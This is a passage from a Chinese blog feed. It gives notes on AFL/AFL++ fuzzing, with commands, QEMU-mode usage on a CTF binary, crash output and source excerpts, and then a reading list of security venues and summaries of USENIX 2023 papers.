Fuzzer)：用户给定初始输入，用户对初始输入做比特翻转，随机插入等方式更改测试数据。<strong>基于代码覆盖率的方式会将能触发新路径的输入样例保存下来，用于后续的测试。</strong></li>\n</ul>\n<p>模糊测试工具的执行流程如下：</p>\n<ul>\n<li>编译源代码并插装，以记录代码覆盖率</li>\n<li>选择输入文件作为初始测试集加入到输入队列。</li>\n<li>对队列文件按照一定策略进行突变</li>\n<li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中</li>\n<li>记录上述过程中触发的crash</li>\n</ul>\n<p>为了解决基于execv函数成本高的问题，AFL是使用fork的方式进行，首先在进行源代码编译的时候对程序进行插装，让程序停留在合适的位置，此时的所有准备工作已经完成，但是还没有能够接收输入的状态进行<strong>fork</strong>。然后接收本次的输入进行运行。其中 <strong>persistent mode</strong>，能够限制提高模糊测试效率，能够保存一些代码覆盖率和一些队列信息。Fuzzer会通过execv启动插装过的进程作为forkserver，forkserver不断fork自身，相当于fuzzer程序是实际被fork程序的祖祖父进程。最终使用execv来执行目标程序，如果目标程序崩溃了就会执行execv之后的代码，如果没有崩溃就会程序正常执行结束。</p>\n<ul>\n<li>forkserver是插装后的待测试程序。</li>\n<li>fuzzer和forserver之间是通过管道进行通信</li>\n<li>程序在插装后会在main函数中停下，等待fuzzer的命令，执行作为forkserver的能力</li>\n<li>fuzz_run_target()函数用于执行目标应用程序、监控超时、返回状态信息，被调用的程序将更新trace_bits[]。其直接调用afl_fsrv_run_target(fsrv, timeout, &amp;afl-&gt;stop_soon)函数。</li>\n</ul>\n<h3 id=\"Mutation策略有哪些\"><a href=\"#Mutation策略有哪些\" class=\"headerlink\" title=\"Mutation策略有哪些\"></a>Mutation策略有哪些</h3><ul>\n<li>最基本的是Basic Mutation：对目标程序的输入进行简单的比特翻转，字节替换，插入删除</li>\n<li>Random Mutation： 随机字节替换与翻转</li>\n<li>字典变异（Dictionary Mutation）：根据用户提供的字典文件，给某些特定位置的字节进行比特上的替换。</li>\n<li>约束变异，在为输入的某些字节限定好约束后，在约束下进行变异。</li>\n</ul>\n<h3 id=\"定向模糊测试（DGF）\"><a href=\"#定向模糊测试（DGF）\" class=\"headerlink\" title=\"定向模糊测试（DGF）\"></a>定向模糊测试（<strong>DGF</strong>）</h3><p><a href=\"https://blog.csdn.net/qq_40229814/article/details/132711607\">https://blog.csdn.net/qq_40229814/article/details/132711607</a></p>\n<ul>\n<li><p>倾向于利用目标位置的工具： 这种工具的主要特征是，它们旨在找到特定的目标位置，目标位置可以是代码的某个位置，如函数、基本块（basic block）或一系列有序的调用点。此类工具的评估标准是基于可见的度量标准，例如在执行跟踪、控制流图或调用图上测量的度量。总之，这种工具具有明确定义的目标位置和可视化的度量标准。</p>\n</li>\n<li><p>倾向于利用目标行为（bug）的工具： 这种工具也具有特定的适应度度量标准（fitness metric），但不同的是，它们没有固定的目标位置。相反，它们旨在测试和发现特定的行为或缺陷，而不关心目标位置。这些工具的目标不需要事先标记，或者在某些情况下无法进行预先标记。此外，它们的适应度度量标准可能不像第一类工具那么容易直观可见。通过优化适应度函数，这种类型的工具可以自动达到目标并揭示缺陷行为。</p>\n</li>\n</ul>\n<p>怎样确定种子：</p>\n<p>AFLGo方法： AFLGo使用源代码在编译时进行仪器化，并通过计算程序单元测试（PUT）的调用和控制流图中边的数量来计算到目标基本块的距离。<strong>然后在运行时，它汇总每个已执行的基本块的距离值，以计算平均值来评估种子。它根据距离对种子进行优先排序，偏向于距离目标更近的种子。</strong></p>\n<p>TOFU方法： TOFU的距离度量标准定义为达到目标所需的正确分支决策数量。</p>\n<p>RDFuzz方法： RDFuzz将距离与基本块的执行频率结合起来，以对种子进行优先排序。</p>\n<p>UAFuzz方法： UAFuzz使用距离度量标准来表示导致目标函数的调用链，这些链更有可能包含分配和释放内存函数，以检测复杂的行为Use-After-Free漏洞。</p>\n<p>AFLChurn方法： AFLChurn不同于传统距离计算，它为基本块分配了数值权重，根据基本块的最近更改或更改频率来确定权重。</p>\n<p>WindRanger方法： WindRanger在计算距离时考虑了偏离基本块（即，执行跟踪开始偏离目标位置的基本块）</p>\n<h3 id=\"关于目前Fuzz的问题\"><a href=\"#关于目前Fuzz的问题\" class=\"headerlink\" title=\"关于目前Fuzz的问题\"></a>关于目前Fuzz的问题</h3><p><a href=\"https://blog.csdn.net/u013648063/article/details/125627454\">https://blog.csdn.net/u013648063/article/details/125627454</a></p>\n<p>没有系统地分析测试程序，几乎是不可能准确地限制输入空间。<strong>由于使用fuzzing的目的不同，执行状态的信息也不局限于代码覆盖率。这些信息可以是协议实现的状态机，面向对象程序的合法执行，并发实现的别名覆盖率，深度学习模型的神经元覆盖率，或者android智能电视的执行日志。</strong></p>\n<p>目前大家的研究方向在于哪些种子被用于下一轮编译</p>\n<p>要花多少时间在某个种子上</p>\n<p>种子应该如何进行变异</p>\n<h3 id=\"关于输入的建模\"><a href=\"#关于输入的建模\" class=\"headerlink\" title=\"关于输入的建模\"></a>关于输入的建模</h3><p>为了生成满足规则的输入，生成过程会严格按照指定的操作来。如果一个输入违反了目标程序的语法或者语义，输入会在早期被程序所丢掉。换句话说，输入空间受控于输入模型。常见的玩法如下：</p>\n<ul>\n<li><p>将fuzzing和特定目标程序之间做对应。比如在测试TLS协议的时候，有TLSAttacker，针对每个字段进行fuzz</p>\n</li>\n<li><p>中间语言转化，将当前的输入转换为规整的IR，这个对fuzz不同的语言处理器是十分有作用的</p>\n</li>\n<li><h4 id=\"Fragment-Recombination：\"><a href=\"#Fragment-Recombination：\" class=\"headerlink\" title=\"Fragment Recombination：\"></a>Fragment Recombination：</h4><ul>\n<li>将输入进行拆分，并且重组成新的文件。Fuzzer会将输入文件解析为一棵树，这样可以保证语法的正确性。</li>\n<li></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"AFL实战\"><a href=\"#AFL实战\" class=\"headerlink\" title=\"AFL实战\"></a>AFL实战</h2><h3 id=\"afl-for-binary\"><a href=\"#afl-for-binary\" class=\"headerlink\" title=\"afl for binary\"></a>afl for binary</h3><figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\">dop@ubuntu:~$ AFL_QEMU_DEBUG_MAPS=1 afl-qemu-trace ./ciscn_2019_c_1<br>400000-402000 r-xp 00000000 08:05 1617251                                /home/dop/ciscn_2019_c_1<br>402000-601000 ---p 00000000 00:00 0<br>601000-602000 r--p 00001000 08:05 1617251                                /home/dop/ciscn_2019_c_1<br>602000-603000 rw-p 00002000 08:05 1617251                                /home/dop/ciscn_2019_c_1<br>4000000000-4000001000 ---p 00000000 00:00 0<br>4000001000-4000801000 rw-p 00000000 00:00 0                              [stack]<br>4000801000-4000802000 r--p 00000000 08:05 1968235                        /usr/lib/x86_64-linux-gnu/ld-2.31.so<br>4000802000-4000825000 r-xp 00001000 08:05 1968235                        /usr/lib/x86_64-linux-gnu/ld-2.31.so<br>4000825000-400082d000 r--p 00024000 08:05 1968235                        /usr/lib/x86_64-linux-gnu/ld-2.31.so<br>400082d000-400082e000 ---p 00000000 00:00 0<br>400082e000-400082f000 r--p 0002c000 08:05 1968235                        /usr/lib/x86_64-linux-gnu/ld-2.31.so<br>400082f000-4000830000 rw-p 0002d000 08:05 1968235                        /usr/lib/x86_64-linux-gnu/ld-2.31.so<br>4000830000-4000833000 rw-p 00000000 00:00 0<br>4000847000-4000869000 r--p 00000000 08:05 1968239                        /usr/lib/x86_64-linux-gnu/libc-2.31.so<br>4000869000-40009e1000 r-xp 00022000 08:05 1968239                        /usr/lib/x86_64-linux-gnu/libc-2.31.so<br>40009e1000-4000a2f000 r--p 0019a000 08:05 1968239                        /usr/lib/x86_64-linux-gnu/libc-2.31.so<br>4000a2f000-4000a33000 r--p 001e7000 08:05 1968239                        /usr/lib/x86_64-linux-gnu/libc-2.31.so<br>4000a33000-4000a35000 rw-p 001eb000 08:05 1968239                        /usr/lib/x86_64-linux-gnu/libc-2.31.so<br>4000a35000-4000a3b000 rw-p 00000000 00:00 0<br>ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]<br>EEEEEEE                            hh      iii<br>EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee<br>EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e<br>EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee<br>EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee<br>====================================================================<br>Welcome to this Encryption machine<br><br>====================================================================<br>1.Encrypt<br>2.Decrypt<br>3.Exit<br>Input your choice!<br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172015669.png\" alt=\"image-20230901091314691\"></p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\"><span class=\"hljs-built_in\">export</span> AFL_QEMU_PERSISTENT_ADDR=0x400B28<br><span class=\"hljs-built_in\">export</span> AFL_QEMU_PERSISTENT_GPR=1<br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"无源码测试\"><a href=\"#无源码测试\" class=\"headerlink\" title=\"无源码测试\"></a>无源码测试</h3><figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 无源码测试基于qemu实现，首先配置qemu</span><br>$ <span class=\"hljs-built_in\">cd</span> qemu_mode<br>$ ./build_qemu_support.sh<br><span class=\"hljs-comment\"># 设置原始输入和输出</span><br>$ <span class=\"hljs-built_in\">mkdir</span> fuzz_in<br>$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"hello\"</span> &gt; fuzz_in/testcase<br>$ gcc test.c -o <span class=\"hljs-built_in\">test</span><br>$ afl-fuzz -i fuzz_in -o fuzz_out -Q ./test<br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172015117.png\" alt=\"image-20230901102144519\"></p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 输出结果</span><br>└── default<br>    ├── cmdline<br>    ├── crashes<br>    │&nbsp;&nbsp; ├── <span class=\"hljs-built_in\">id</span>:000000,sig:11,src:000000+000030,time:3961,execs:13145,op:splice,rep:4<br>    │&nbsp;&nbsp; ├── <span class=\"hljs-built_in\">id</span>:000001,sig:04,src:000000+000030,time:3961,execs:13146,op:splice,rep:5<br>    │&nbsp;&nbsp; ├── <span class=\"hljs-built_in\">id</span>:000002,sig:04,src:000000+000026,time:3985,execs:13213,op:splice,rep:8<br>    │&nbsp;&nbsp; ├── <span class=\"hljs-built_in\">id</span>:000003,sig:11,src:000043+000009,time:4075,execs:13502,op:splice,rep:16<br>    │&nbsp;&nbsp; ├── <span class=\"hljs-built_in\">id</span>:000004,sig:11,src:000035+000023,time:4240,execs:14064,op:splice,rep:16<br>    │&nbsp;&nbsp; ├── <span class=\"hljs-built_in\">id</span>:000005,sig:11,src:000025+000037,time:4319,execs:14316,op:splice,rep:6<br>    │&nbsp;&nbsp; └── README.txt<br>    ├── fuzz_bitmap<br>    ├── fuzzer_setup<br>    ├── fuzzer_stats<br>    ├── hangs<br>    ├── plot_data<br>    └── queue<br>        ├── <span class=\"hljs-built_in\">id</span>:000000,time:0,execs:0,orig:testcase<br>        ├── <span class=\"hljs-built_in\">id</span>:000001,src:000000,time:4,execs:12,op:havoc,rep:2,+cov<br>        ├── <span class=\"hljs-built_in\">id</span>:000002,src:000000,time:6,execs:20,op:havoc,rep:1<br>        ├── <span class=\"hljs-built_in\">id</span>:000003,src:000000,time:9,execs:28,op:havoc,rep:1<br>        ├── <span class=\"hljs-built_in\">id</span>:000004,src:000000,time:12,execs:37,op:havoc,rep:1<br><span class=\"hljs-comment\"># </span><br>crashes：存放去重后触发crash的数据<br><br>fuzz_bitmap：记录代码覆盖率<br><br>fuzzer_stats：fuzz状态<br><br>hangs：存放去重后触发挂起的数据<br><br>plot_data：绘图数据<br><br>queue：有效的样本集合<br><br></code></pre></td></tr></tbody></table></figure>\n\n<p>如果需要对so文件进行测试，需要将相应的动态链接库目录加入到环境变量中</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\"><span class=\"hljs-built_in\">export</span> QEMU_LD_PREFIX=<span class=\"hljs-variable\">$LD_LIBRARY_PATH</span>:<br><span class=\"hljs-built_in\">export</span> LD_LIBRARY_PATH=<span class=\"hljs-variable\">$LD_LIBRARY_PATH</span><br><span class=\"hljs-comment\"># 两个都试试吧</span><br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"自定义fuzz策略\"><a href=\"#自定义fuzz策略\" class=\"headerlink\" title=\"自定义fuzz策略\"></a>自定义fuzz策略</h3><p><a href=\"https://www.anquanke.com/post/id/254363\">https://www.anquanke.com/post/id/254363</a></p>\n<p><a href=\"https://github.com/AFLplusplus/AFLplusplus/blob/dev/docs/custom_mutators.md%E3%80%81\">https://github.com/AFLplusplus/AFLplusplus/blob/dev/docs/custom_mutators.md、</a></p>\n<h4 id=\"官方自定义文档\"><a href=\"#官方自定义文档\" class=\"headerlink\" title=\"官方自定义文档\"></a>官方自定义文档</h4><p><a href=\"https://github.com/AFLplusplus/AFLplusplus/blob/dev/docs/custom_mutators.md#2-apis\">https://github.com/AFLplusplus/AFLplusplus/blob/dev/docs/custom_mutators.md#2-apis</a></p>\n<h4 id=\"安装libprotobuf\"><a href=\"#安装libprotobuf\" class=\"headerlink\" title=\"安装libprotobuf\"></a>安装libprotobuf</h4><figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提示cmake 版本太低 https://www.cnblogs.com/jsdy/p/12689470.html#_label0</span><br>升级cmake <br>$ wget http://www.cmake.org/files/v3.25/cmake-3.25.2.tar.gz<br>./bootstrap<br>make<br>make install<br><span class=\"hljs-comment\"># 出找不到openssl </span><br>Could NOT find OpenSSL, try to <span class=\"hljs-built_in\">set</span> the path to OpenSSL root folder <span class=\"hljs-keyword\">in</span> the system variable OPENSSL_ROOT_DIR (missing: OPENSSL_LIBRARIES OPENSSL_INCLUDE_DIR) <br>$ sudo apt-get install libssl-dev<br><br></code></pre></td></tr></tbody></table></figure>\n\n<p>安装libxml4</p>\n<p>autogen.sh </p>\n<p>报错：<br>configure.ac:1087: error: possibly undefined macro: m4_ifdef<br>      If this token and others are legitimate, please use m4_pattern_allow.<br>      See the Autoconf documentation.</p>\n<p>解决方案：sudo cp /usr/share/aclocal/*.m4 /usr/local/share/aclocal/<br><a href=\"https://www.cnblogs.com/y4247464/p/14388334.html\">https://www.cnblogs.com/y4247464/p/14388334.html</a></p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309081527504.png\">\t</p>\n<p>本文介绍如何利用AFL Plus Plus实现自定义目标的模糊测试。</p>\n<p>Tutorials ： <a href=\"https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/tutorials.md\">https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/tutorials.md</a></p>\n<h3 id=\"AFL源码阅读\"><a href=\"#AFL源码阅读\" class=\"headerlink\" title=\"AFL源码阅读\"></a>AFL源码阅读</h3><figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-comment\">// afl-fuzz.h: line 431</span><br><span class=\"hljs-comment\">// 该结构用于存储本次afl运行所需要的上下文内容</span><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">afl_state</span> {</span><br><span class=\"hljs-comment\">/* Position of this state in the global states list */</span><br>  u32 _id;<br><br>  <span class=\"hljs-type\">afl_forkserver_t</span> fsrv;<br>  <span class=\"hljs-type\">sharedmem_t</span>      shm;<br>  <span class=\"hljs-type\">sharedmem_t</span>     *shm_fuzz;<br>  <span class=\"hljs-type\">afl_env_vars_t</span>   afl_env;\t<br>  <span class=\"hljs-comment\">//...</span><br>} <span class=\"hljs-type\">afl_state_t</span>;<br><br><span class=\"hljs-comment\">// afl-fuzz-init.c 该函数的目的是使用原始输入执行程序</span><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">perform_dry_run</span><span class=\"hljs-params\">(<span class=\"hljs-type\">afl_state_t</span> *afl)</span> {}<br><br><span class=\"hljs-comment\">// afl-forkserver.c </span><br><span class=\"hljs-comment\">// 该函数用于进行子程序的执行</span><br><span class=\"hljs-type\">fsrv_run_result_t</span> __attribute__((hot))<br>afl_fsrv_run_target(<span class=\"hljs-type\">afl_forkserver_t</span> *fsrv, u32 timeout,<br>                    <span class=\"hljs-keyword\">volatile</span> u8 *stop_soon_p) {<br><br></code></pre></td></tr></tbody></table></figure>\n\n",
            "tags": [
                "fuzz"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/08/22/xiang-guan-lun-wen-he-ji/",
            "url": "https://alazymechnaic.github.io/2023/08/22/xiang-guan-lun-wen-he-ji/",
            "title": "相关论文合集",
            "date_published": "2023-08-22T02:00:57.000Z",
            "content_html": "<h2 id=\"安全相关论文及博客汇总\"><a href=\"#安全相关论文及博客汇总\" class=\"headerlink\" title=\"安全相关论文及博客汇总\"></a>安全相关论文及博客汇总</h2><hr>\n<h3 id=\"安全会议\"><a href=\"#安全会议\" class=\"headerlink\" title=\"安全会议\"></a>安全会议</h3><ul>\n<li><strong>NDSS</strong>：  <a href=\"https://www.ndss-symposium.org/ndss2023/accepted-papers/\">https://www.ndss-symposium.org/ndss2023/accepted-papers/</a></li>\n<li><strong>ACM CCS</strong>： <a href=\"https://www.sigsac.org/ccs/CCS2023/\">https://www.sigsac.org/ccs/CCS2023/</a></li>\n<li><strong>USENIX</strong>：<a href=\"https://www.usenix.org/conference/usenixsecurity23/\">https://www.usenix.org/conference/usenixsecurity23/</a></li>\n<li><strong>S&amp;P</strong>: <a href=\"https://www.ieee-security.org/TC/SP2023/program-papers.html\">https://www.ieee-security.org/TC/SP2023/program-papers.html</a></li>\n</ul>\n<h3 id=\"更新活跃的安全媒体\"><a href=\"#更新活跃的安全媒体\" class=\"headerlink\" title=\"更新活跃的安全媒体\"></a>更新活跃的安全媒体</h3><ul>\n<li><strong>先知社区</strong>：<a href=\"https://xz.aliyun.com/\">https://xz.aliyun.com/</a></li>\n<li><strong>安全客</strong>：<a href=\"https://www.anquanke.com/\">https://www.anquanke.com/</a></li>\n<li><strong>360 核心安全技术博客</strong>：<a href=\"https://blogs.360.net/\">https://blogs.360.net/</a></li>\n</ul>\n<h3 id=\"技术博客\"><a href=\"#技术博客\" class=\"headerlink\" title=\"技术博客\"></a>技术博客</h3><ul>\n<li><strong>知道创宇</strong>：<a href=\"https://paper.seebug.org/\">https://paper.seebug.org/</a></li>\n<li><strong>棱角社区</strong>：<a href=\"https://forum.ywhack.com/forum-59-1.html\">https://forum.ywhack.com/forum-59-1.html</a></li>\n<li><strong>奇安信攻防社区</strong>：<a href=\"https://forum.butian.net/community/all/newest\">https://forum.butian.net/community/all/newest</a></li>\n</ul>\n<p><strong>Personal Blog</strong></p>\n<ul>\n<li>游戏安全：<a href=\"https://www.perfare.net/\">https://www.perfare.net/</a></li>\n<li>逆向工程：<a href=\"https://tinyhack.com/\">https://tinyhack.com/</a></li>\n<li>漏洞分析：<a href=\"https://gtoad.github.io/\">https://gtoad.github.io/</a></li>\n</ul>\n<hr>\n<h2 id=\"usenix\"><a href=\"#usenix\" class=\"headerlink\" title=\"usenix\"></a>usenix</h2><h3 id=\"Viper-Spotting-Syscall-Guard-Variables-for-Data-Only-Attacks\"><a href=\"#Viper-Spotting-Syscall-Guard-Variables-for-Data-Only-Attacks\" class=\"headerlink\" title=\"Viper: Spotting Syscall-Guard Variables for Data-Only Attacks\"></a>Viper: Spotting Syscall-Guard Variables for Data-Only Attacks</h3><p>由于控制流保护技术得到广泛应用，攻击者很难修改控制数据，如函数指针，以劫持程序的控制流。相反，仅针对数据的攻击会破坏安全关键的非控制数据（关键数据），并且可以绕过所有的控制流保护措施，实施严重的攻击。以前的研究已经探索了各种方法来帮助构建或防止仅针对数据的攻击。然而，目前还没有解决方案能够自动检测程序特定的关键数据。</p>\n<p>在本文中，我们确定了一个重要的关键数据类别，即系统调用保护变量（syscall-guard variables），并提出了一组解决方案，以可扩展的方式自动检测此类变量。系统调用保护变量决定是否调用与安全相关的系统调用（syscalls），修改它们将允许攻击者向操作系统请求额外的特权。我们提出了分支强制（branch force）的方法，在执行过程中有意地翻转每个条件分支，并检查是否调用了新的与安全相关的系统调用。如果是这样，我们通过常见的内存错误进行数据流分析，估计翻转这些分支的可行性。我们构建了一个名为VIPER的工具来实现我们的想法。VIPER成功地从13个程序中检测到了34个以前未知的系统调用保护变量。我们对sqlite和v8进行了四种新的仅针对数据的攻击，可以执行任意命令或删除任意文件。VIPER在大多数程序中在五分钟内完成分析，显示了其用于发现系统调用保护变量的实用性。</p>\n<p><a href=\"https://www.usenix.org/system/files/usenixsecurity23-ye.pdf\">usenixsecurity23-ye.pdf</a></p>\n<h3 id=\"Not-All-Data-are-Created-Equal-Data-and-Pointer-Prioritization-for-Scalable-Protection-Against-Data-Oriented-Attacks\"><a href=\"#Not-All-Data-are-Created-Equal-Data-and-Pointer-Prioritization-for-Scalable-Protection-Against-Data-Oriented-Attacks\" class=\"headerlink\" title=\"Not All Data are Created Equal: Data and Pointer Prioritization for Scalable Protection Against Data-Oriented Attacks\"></a><strong>Not All Data are Created Equal: Data and Pointer Prioritization for Scalable Protection Against Data-Oriented Attacks</strong></h3><p>数据导向的攻击在大多数操作系统中对最先进的防御措施变得越来越现实和有效。这些攻击操纵内存中的数据对象（数据和指针），而不改变程序的控制流。用于保护数据和指针的软件和硬件防御措施由于对所有数据对象的过度插装而遭受性能瓶颈的困扰。在这项工作中，我们提出了一种基于规则启发的数据和指针优先级（Data and Pointer Prioritization，DPP）框架，用于自动识别应用程序中的敏感内存对象，并仅保护那些敏感数据，利用现有的防御措施。我们使用Linux Flaw Project数据集、Juliet测试套件和五个用于演示数据导向攻击的真实世界程序来评估我们框架的正确性。我们的实验结果表明，DPP可以通过优先处理仅占总数据对象数量3-4%的对象来识别我们测试应用程序中的易受攻击的数据对象。我们对SPEC CPU2017整数基准套件的评估结果显示，启用了DPP的AddressSanitizer（ASan）在保护所有优先级数据对象的同时，可以将性能（吞吐量）提高1.6倍，并将运行时开销减少70%，相比默认的ASan。</p>\n<p><a href=\"https://yaogroup.cs.vt.edu/dpp-usenix-23.pdf\">dpp-usenix-23.pdf (vt.edu)</a></p>\n<h3 id=\"sAFer-Efficient-and-Error-Tolerant-Binary-Instrumentation\"><a href=\"#sAFer-Efficient-and-Error-Tolerant-Binary-Instrumentation\" class=\"headerlink\" title=\"sAFer: Efficient and Error-Tolerant Binary Instrumentation\"></a><strong>sAFer: Efficient and Error-Tolerant Binary Instrumentation</strong></h3><p>最近在二进制插桩方面的进展主要集中在性能方面。通过静态转换代码以避免额外的运行时操作，诸如Egalito和RetroWrite等系统实现了接近零的开销。这些静态转换的安全性依赖于几个假设：(a)无错误和完整的反汇编，(b)独占使用位置无关代码，(c)代码指针识别既没有误报也没有漏报。这些假设的违反可能导致插桩程序崩溃，甚至更糟糕的是，出现延迟故障导致数据损坏或安全受损。许多早期的二进制插桩技术（如DynamoRio、Pin和BinCFI）最小化了这些假设，但代价是更高的开销，尤其是对于间接调用密集（例如C++）的应用程序。因此，一个开放的研究问题是是否可以将早期的安全性优点与最近的性能优点相结合。我们以肯定的回答这个问题，提出了一种新的插桩技术，它(a)容忍使用位置相关代码和常见的反汇编和静态分析错误，(b)在运行时检测假设违规，以防止出现未定义行为。我们的方法提供了一种优雅关闭或恢复的故障崩溃机制。我们在不牺牲性能的情况下实现了安全的插桩，开销约为2%左右。</p>\n<p><a href=\"http://seclab.cs.sunysb.edu/seclab/pubs/safer.pdf\">safer.pdf (sunysb.edu)</a></p>\n<h3 id=\"Reassembly-is-Hard-A-Reflection-on-Challenges-and-Strategies\"><a href=\"#Reassembly-is-Hard-A-Reflection-on-Challenges-and-Strategies\" class=\"headerlink\" title=\"Reassembly is Hard: A Reflection on Challenges and Strategies\"></a><strong>Reassembly is Hard: A Reflection on Challenges and Strategies</strong></h3><p>​\t重组（Reassembly）是静态二进制重写的一个分支，如今已成为研究的焦点。然而，尽管它被广泛使用并引起了研究的兴趣，但目前还没有对重组技术和挑战进行系统的调查。在本文中，我们正式定义了当前现有的重组器中出现的不同类型的错误，并提出了一个名为REASSESSOR的自动化工具来发现这些错误。我们试图通过我们的工具和我们创建的大规模基准测试来展示当前领域面临的挑战以及如何解决这些挑战。</p>\n<p><a href=\"https://www.usenix.org/system/files/sec23summer_439-kim_hyungseok-prepub.pdf\">sec23summer_439-kim_hyungseok-prepub.pdf (usenix.org)</a></p>\n<h3 id=\"FloatZone-Accelerating-Memory-Error-Detection-using-the-Floating-Point-Unit\"><a href=\"#FloatZone-Accelerating-Memory-Error-Detection-using-the-Floating-Point-Unit\" class=\"headerlink\" title=\"FloatZone: Accelerating Memory Error Detection using the Floating Point Unit\"></a><strong>FloatZone: Accelerating Memory Error Detection using the Floating Point Unit</strong></h3><p>​\t内存消毒器（Memory sanitizers）是检测空间和时间内存错误（如缓冲区溢出和使用释放后内存）的强大工具。模糊测试器和软件测试人员通常依赖这些工具来发现错误的存在。然而，消毒器会产生显著的运行时开销。例如，最广泛使用的消毒器——地址消毒器（Address Sanitizer，ASan）会导致2倍的减速。这种开销的主要来源是消毒器检查，其中至少涉及内存查找、比较和条件分支指令。将这些检查应用于确认程序中内存访问的有效性会大大减慢执行速度。</p>\n<p>​\t我们引入了FloatZone，一种基于编译器的消毒器，使用轻量级检查利用浮点单元（FPU）来检测C/C++程序中的空间和时间内存错误。我们展示了通过单个浮点加法触发下溢异常来实现“查找、比较和分支”的综合效果，以检测内存违规访问。这种新颖的检测方法通过避免传统比较的缺点大大提高了性能：它防止了分支预测错误，通过卸载到FPU实现更高的指令级并行性，并且由于没有阴影内存，降低了缓存失效率。</p>\n<p>我们的评估结果显示，FloatZone在SPEC 